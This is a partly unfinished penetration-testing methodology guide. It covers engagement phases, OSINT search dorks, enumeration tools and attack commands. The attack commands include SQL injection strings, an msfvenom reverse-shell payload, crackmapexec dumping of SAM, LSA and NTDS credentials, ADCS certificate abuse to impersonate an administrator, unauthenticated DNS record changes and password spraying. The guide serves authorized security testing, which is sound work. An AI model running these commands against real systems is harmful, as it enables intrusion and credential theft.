# Introduction
This document is intended to serve as a valuable resource for both novice and experienced penetration testers, providing guidance on the essential principles, methodologies, and techniques involved in assessing the security of systems and networks.
### Legal and Ethical Considerations
Before embarking on any penetration test, it is crucial to emphasize the importance of conducting such activities within the boundaries of legality and ethics. Unauthorized or irresponsible testing can lead to legal consequences, damage to systems, and reputational harm.

**Authorization and Consent**: Always ensure that you have explicit authorization from the client or organization before conducting any penetration test. This includes defining the scope of the engagement, obtaining written consent, and adhering to any legal requirements and industry regulations.

**Ethical Conduct**: Penetration testers are expected to adhere to a strict code of ethics. This includes respecting privacy, not causing harm to systems, and reporting any discovered vulnerabilities responsibly.
### Document Scope
This document provides a structured framework for conducting penetration tests, it is important to note that the methods outlined here are not exhaustive. This document serves as a foundation and reference point; don't hesitate to adapt and tailor your approach to specific scenarios.
### Engagement Types
Clients will commission different test types based on their needs. The most common assessments include an external and an internal pentest. Larger organizations might commission a full red team engagement which will include several other engagement types as part of an adversary simulation. 
- OSINT - Passive reconnaissance on a target using publicly available sources.
- Social Engineering - Coerce information/access from the people at the target org.
- Physical - Attempt to gain access to secure areas of a physical location. 
- External - Attempt to gain entry to the internal network from the internet.
- Internal - Attempt to escalate privileges from within the target network.
- WebApp - Attempt to exploit a web application to gain privileged access. 
- Mobile - Attempt to exploit a mobile application and/or the backend APIs. 
- Red Team - Full adversary simulation.
- Purple Team - Adversary simulation where the Blue Team cooperates with the Red Team to detect/remediate threats in real time. 
## Engagement Timeline
### Gathering Documentation
Make sure you have a statement of work (SoW), scoping information, any network documentation needed, credentials, contact information, and a list of systems that are in-scope but might be sensitive to testing. 
### Kickoff Call
Make sure to cover start and end times, dates, and any information in the initial scoping documentation. Address concerns with reporting, whitelisting, etc. during the kickoff call to save some time later. 
### Active Testing
During this phase of testing, clients should be informed of start and end times as well as potentially critical vulnerabilities that are found. Any time exploitation is performed or an account is compromised the client should be informed. Theoretically speaking, you should have a technical contact for any actions performed during this stage to let the blue team know alerts are not true incidents as soon as possible. Note that during a true red team engagement, this might not happen. 
### Vulnerability Scanning
Once active testing is finished, vulnerability scans should be performed to catch any vulnerabilities that were not identified during the engagement and provide an additional layer of reporting that the client can use to remediate issues. 
### Reporting
Reporting should begin as soon as possible once an engagement is started and finished within a week of the engagement ending. Good notes and a solid framework for automating report writing should make this easy. 
### Closeout Call
The closeout call will be scheduled as part of the final report delivery. Be prepared to go over the results of your test and answer any questions the client might have about remediation options. 
# Framework
## Pre-Engagement
### Risk Assessment
Before a pentest is performed, it is recommended that clients get a risk assessment. This way they can direct the pentest toward the crown jewels of the organization. This will usually lead to better scoping/rules of engagement and an easier closeout call. 
### Scope and Rules of Engagement
Pentest scope should be fully established and validated (especially on external assessments) prior to testing. Along with your scope you should receive rules of engagement. These will usually consist of test conditions that are explicitly allowed and a list of tests the client does not want performed. 
### Client Communication
Establish start/stop times and a general narrative of what testing will be performed. Additionally, establish conditions for actions that should be reported to the client. Most of the time they will not know what is normal/necessary in this area, so expect to provide some recommendations. In general, admin compromise, malware deployment, and any conditions that might impact performance should be communicated to the client. 
### Credentials and Access Handling
In some engagements the client will provide credentials to test or perform vulnerability scans with. In any case, what actions/communication should follow the collection of credentials should be well established. Most of the time, you will want to let your client know when you have compromised an account so they can monitor for alerts regarding that account and either ignore them or allow the actions you are attempting to perform. During a red team engagement, this will not be the case.   
### Data Handling
As part of the rules of engagement, actions allowed on sensitive data should be well established. If they are not and access is obtained, it is imperative that you get permission before exfiltrating or modifying anything. 
## Initial Reconnaissance
### OSINT (Open Source Intelligence)
#### Google
https://www.exploit-db.com/google-hacking-database
Search Pastebin
- `site:pastebin.com intext:"CompanyName"`
Search GitHub
- `site:github.com intext:"CompanyName"`
Search Docker Hub
- `site:hub.docker.com intext:"CompanyName"`
Search for S3 buckets
- `site:amazonaws.com inurl:s3 intext:"CompanyName"`
Search for Azure blobs
- `site:blob.core.windows.net intext:"CompanyName"`
Find email addresses in text
- `grep -E -o "\b[A-Za-z0-9._%+-]+@[A-Za-z0-9.-]+\.[A-Za-z]{2,6}\b"`
#### LinkedIn
Create list of usernames
- `linkedin2username your_linkedin@email.com corp -n @corp.com -o ./li2u/corp/`
#### Websites
- Whois: https://whois.domaintools.com/
- Reverse Whois: https://reversewhois.domaintools.com/
- ICANN IP Lookup: https://lookup.icann.org/en/lookup- 
- Internet Connected Host Search: https://www.shodan.io
- DNS Archives: https://dnsdumpster.com
- Breach DB Search: https://www.dehashed.com
#### Brute-Force Domain Discovery
Enumerate sub-domains
- `gobuster dns -d example.com -w /wordlists/domains.txt -i`
https://subscription.packtpub.com/book/security/9781785284588/2/ch02lvl1sec16/fierce
- `fierce -dns example.com -wordlist /wordlists/domains.txt`
### Scanners Network/Service Enumeration
#### Network
##### SMB
- `smbmap -H 127.0.0.1 -u $user -p $password -R --depth 3 --exclude IPC$`
##### DNS
Request short list of domains on the nameserver:
- `dig +short ns nameserver.dns`
Request all DNS records on the name server (TXT, MX, A, etc.):
- `dig @nameserver domain.local -t ANY`
Request DNS name for IP address:
- `dig 127.0.0.1 @nameserver`
Attempt DNS zone transfer:
- `dig axfr nameserver.dns @domain.to.transfer`
Sometimes, nameservers can be modified without credentialed access:
```r
nsupdate 
> server 127.0.0.1 53 
> update delete example.com A  
> send 
> update add example.com 86400 A 127.0.0.1 
> send
```
#### Cloud
- 
#### WebApp
- `gobuster dir -u https://example.com -w /wordlists/test.txt -lk -o gobuster.txt` 
- `nikto -h https://example.com`
- `wpscan --url https://example.com -e -o wpscan.txt`
- `dirsearch -u http://example.com`
- `feroxbuster -u http://example.com -L 10 -t 10 -qn`
SQLMap
- `sqlmap -r form.sqlmap --batch`
- `sqlmap -r form.sqlmap --batch --dbms sqlite --tables`
- `sqlmap -r form.sqlmap --batch --dbms sqlite -t $table --dump`
#### API
https://book.hacktricks.xyz/network-services-pentesting/pentesting-web/web-api-pentesting
Find WordPress users API
- `inurl:"/wp-json/wp/v2/users"`
Find exposed API keys
- `intitle:"index.of" intext:"api.txt"`
Find interesting API directories
- `inurl:"/api/v1" intext:"index of /"`
Sites with XenAPI SQLi vulnerabilities
- `ext:php inurl:"api.php?action="`
Finds potentially exposed API keys
- `intitle:"index of" api_key OR "api key" OR apiKey -pool`
Search GitHub issues and previous versions
- `site:github.com inurl:api`
Use Amass for api enumeration
- `amass enum -active -d target-name.com | grep api`
- `amass enum -active -brute -w /usr/share/wordlists/API_superlist -d [target domain] -dir [directory name]`
Use Kiterunner to enumerate API endpoints
- `kr scan HTTP://127.0.0.1 -w ~/api/wordlists/data/kiterunner/routes-large.kite`
#### Web-App Analysis
- Wappalyzer - Identify technologies used. 
- Entry Points - Input, uploads, buttons, URL parameters, etc.  
- Guest Accounts - Authenticated session without credentials?
- User Enumeration - Login errors, IDOR, etc.
- `sslyze https://example.com` - Checks for SSL/TLS issues. 
#### Vulnerability Scanners
- `nuclei -l hosts.txt -o nuclei.txt`
### Wordlist Generation
## Web Application Testing
### Server-Side Testing
#### SQL Injection (SQLi)
- `valid_input'-- -`
- `valid_input'select * from information_schema.tables -- -`
#### Content Security Policy (CSP) Testing
#### Server-Side Request Forgery (SSRF) Testing
#### Web Cache Poisoning
#### HTTP Host Header Attacks
#### HTTP Request Smuggling
#### OAuth and JWT Attacks
#### Prototype Pollution
#### Server-Side Template Injection (SSTi)
#### GraphQL Security Testing
### Client-Side Testing
#### Cross-Site Scripting (XSS)
#### Cross-Site Request Forgery (CSRF)
URL in URL
- `http://example.com/index.php?request=http://example2.com/image.png`
URL in Header
- `Host:http://example.com/endpoint/image.png`
#### Cross-Origin Resource Sharing (CORS)
#### Clickjacking
- [Burp Clickbandit](https://portswigger.net/burp/documentation/desktop/testing-workflow/testing-for-clickjacking)
- [Clickjacking Test Site](https://clickjacker.io)
#### DOM Vulnerabilities
#### WebSockets Security Testing
#### Client-Side Template Injection (CSTi)
## API Testing
https://book.hacktricks.xyz/network-services-pentesting/pentesting-web/web-api-pentesting
Find WordPress users API
- `inurl:"/wp-json/wp/v2/users"`
Find exposed API keys
- `intitle:"index.of" intext:"api.txt"`
Find interesting API directories
- `inurl:"/api/v1" intext:"index of /"`
Sites with XenAPI SQLi vulnerabilities
- `ext:php inurl:"api.php?action="`
Finds potentially exposed API keys
- `intitle:"index of" api_key OR "api key" OR apiKey -pool`
Search GitHub issues and previous versions
- `site:github.com inurl:api`
Use Amass for API enumeration
- `amass enum -active -d target-name.com | grep api`
- `amass enum -active -brute -w /usr/share/wordlists/API_superlist -d [target domain] -dir [directory name]`
Use Kiterunner to enumerate API endpoints
- `kr scan HTTP://127.0.0.1 -w ~/api/wordlists/data/kiterunner/routes-large.kite`
## Service Exploitation
### DNS Exploitation
### SMB Exploitation
### Cloud Exploitation
## Endpoint Exploitation
### Cisco 
#### Smart Install
### IoT Devices
#### Passback Attacks
### Docker
### Windows
https://casvancooten.com/posts/2020/11/windows-active-directory-exploitation-cheat-sheet-and-command-reference/
#### Unquoted Service Path
Find vulnerable services using PowerShell:
`Get-WmiObject -class Win32_Service -Property Name, DisplayName, PathName, StartMode | Where {$_.PathName -notlike "C:\Windows*" -and $_.PathName -notlike '"*'} | select Name,DisplayName,StartMode,PathName`
- [ ] .lnk files
- [ ] WTFBins
- [ ] BloodHound/SharpHound
- [ ] WinPEAS
Check write permissions in directory before the space: 
`Get-Acl C:\DirectoryName\`
Generate payload:
`msfvenom -p windows/x64/shell/reverse_tcp LHOST=127.0.0.1 LPORT=9001 -f exe-service -o mal.exe`
- [ ] Petit Pottam
- [ ] DLL Hijacking
- [ ] DLL Sideloading
- [ ] DLL Injection
#### Access
##### AppDomain 
##### LOLBins
##### WinRM Shell
Port 5985 open, with credentials
- `evil-winrm -i <IP_ADDRESS> -u <USERNAME> -p <PASSWORD>`
#### Privilege Escalation
##### Unquoted Service Path
##### Credential Caches
Dump credential caches
- `crackmapexec smb 127.0.0.1 -u $username -p $password --lsa`
- `crackmapexec smb 127.0.0.1 -u $username -p $password --sam`
Clone domain controller
- `crackmapexec smb 127.0.0.1 -u $username -p $password --ntds --users --enabled` (Requires DA, don't use this without permission from the client)
##### Named Pipe Exploits
##### Privilege Abuse
`SeImpersonate` or `SeAssignPrimaryToken` 
- RottenPotato, JuicyPotato, RoguePotato, PrintSpoofer, and SharpEfsPotato
##### Dropping Malware
Check write permissions in directory before the space: 
`Get-Acl C:\DirectoryName\`
Generate payload:
`msfvenom -p windows/x64/shell/reverse_tcp LHOST=127.0.0.1 LPORT=9001 -f exe-service -o mal.exe`
### Active Directory
https://casvancooten.com/posts/2020/11/windows-active-directory-exploitation-cheat-sheet-and-command-reference/
https://zer1t0.gitlab.io/posts/attacking_ad/
- [ ] NTLM Relay
- [ ] IPv6 (MITM6)
#### ADCS Abuse
Windows enumerate vulnerable certificates
- `certify.exe find domain.local/user:pass@domain.local -vulnerable`
Linux enumerate vulnerable certificates
- `certipy-ad find -u 'user' -p 'pass' -dc-ip '127.0.0.1' -vulnerable -stdout`
Request vulnerable certificate for admin
- `certipy-ad req -u 'user' -p 'pass' -dc-ip '127.0.0.1' -ca 'DOMAIN-CA' -target 'dc.local' -template 'VULN-TEMPLATE' -upn 'administrator@domain.local' -ns '127.0.0.1'`
#### GetNPUsers
#### GetUserSPNs

### Linux
Check for `sudo no password` commands
- `sudo -l`
- [GTFOBins](https://gtfobins.github.io)
- [LinPEAS](https://github.com/carlospolop/PEASS-ng/tree/master/linPEAS)
Find files created by a user
- `find / -user $USER ! -path "*proc*" ! -path "*var*" ! -path "*dev*" 2>/dev/null`
- [ ] `sudo` version
- [ ] `ssh` version
- [ ] Kernel Exploits
## Password Attacks
### Testing Logins & MFA
#### Default Credentials
#### MFASweep
#### Hydra
`hydra 127.0.0.1 ssh -l $user -P /wordlist.txt -s 22 -vV`
### Password Spraying
#### Burp
#### CrackMapExec
- `crackmapexec smb scope.txt -u users.txt -p passwords.txt`
#### Go365
- `go365 -endpoint rst -ul users.txt -pl passwords.txt -d domain.com -w 5 -delay 1600 -o go365_domain.txt`
#### WPScan
- `wpscan --url http://example.com -e u --passwords /usr/share/wordlists/pass.txt`
## Useful Tricks
### File Transfers
Simple HTTP server
- `python3 -m http-server`
SCP
- `scp user@host1.local:/file/to/send user@host2:/where/to/place`
### SSH Tunneling & Port Forwarding
SSH forward remote port 8000 to localhost:1234
- `ssh -L 1234:localhost:8000 user@$rhost`
SSH Dynamic SOCKS Proxy
- `ssh -D 9001 user@203.0.113.10`
Add SOCKS proxy:
- `socks4 203.0.113.10 9001`
Use SOCKS proxy to run a command: 
- `proxychains4 crackmapexec smb $target --shares`
## Conclusion
### Cleanup
### Lessons Learned
### Reporting

## References
### Frameworks
### Methodology
### Theory
